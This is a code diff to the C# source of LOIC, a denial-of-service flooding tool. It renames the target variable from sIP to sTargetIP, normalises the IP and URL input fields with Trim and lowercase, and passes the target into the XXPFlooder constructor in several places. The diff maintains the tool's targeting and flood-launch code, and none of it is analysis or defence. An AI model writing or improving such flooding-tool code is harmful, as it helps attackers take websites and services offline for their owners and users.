@@ -24,7 +24,7 @@ namespace LOIC
 		private StringCollection aUpOLSites = new StringCollection();
 		private StringCollection aDownOLSites = new StringCollection();
 		private bool bIsHidden = false;
-		private string sIP, sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
+		private string sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
 		private int iPort, iThreads, iDelay, iTimeout, iSockspThread;
 		private Protocol protocol;
 		private bool bResp, intShowStats;
@@ -107,8 +107,8 @@ namespace LOIC
 						return;
 					}
 
-					sIP = txtTarget.Text;
-					if (String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
+					sTargetIP = txtTarget.Text;
+					if (String.IsNullOrEmpty(sTargetIP) || String.Equals(sTargetIP, "N O N E !"))
 						throw new Exception("Select a target.");
 
 					sMethod = cbMethod.Text;
@@ -145,9 +145,7 @@ namespace LOIC
 					}
 
 					bResp = chkResp.Checked;
-
 					sTargetDNS = txtTargetURL.Text;
-					sTargetIP = txtTargetIP.Text;
 
 					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil)
 					{
@@ -199,7 +197,7 @@ namespace LOIC
 					}
 					if ((int)protocol == 2 || (int)protocol == 1)
 					{
-						ts = new XXPFlooder(sIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+						ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
 					}
 
 					if(ts != null)
@@ -254,12 +252,12 @@ namespace LOIC
 		/// <param name="silent">Silent?</param>
 		private void LockOnIP(bool silent = false)
 		{
-			if (txtTargetIP.Text.Length == 0)
+			if (txtTargetIP.Text.Trim().ToLowerInvariant().Length == 0)
 			{
 				Wtf ("I think you forgot the IP.", silent);
 				return;
 			}
-			txtTarget.Text = txtTargetIP.Text;
+			txtTarget.Text = txtTargetIP.Text.Trim().ToLowerInvariant();
 		}
 
 		/// <summary>
@@ -268,7 +266,7 @@ namespace LOIC
 		/// <param name="silent">Silent?</param>
 		private void LockOnURL(bool silent = false)
 		{
-			string url = txtTargetURL.Text.ToLowerInvariant();
+			string url = txtTargetURL.Text.Trim().ToLowerInvariant();
 			if (url.Length == 0)
 			{
 				Wtf ("A URL is fine too...", silent);
@@ -920,7 +918,7 @@ namespace LOIC
 							}
 							if ((int)protocol == 2 || (int)protocol == 1)
 							{
-								ts = new XXPFlooder(sIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+								ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
 							}
 
 							if(ts != null)
@@ -960,7 +958,7 @@ namespace LOIC
 						}
 						if ((int)protocol == 2 || (int)protocol == 1)
 						{
-							ts = new XXPFlooder(sIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+							ts = new XXPFlooder(sTargetIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
 						}
 
 						if(ts != null)
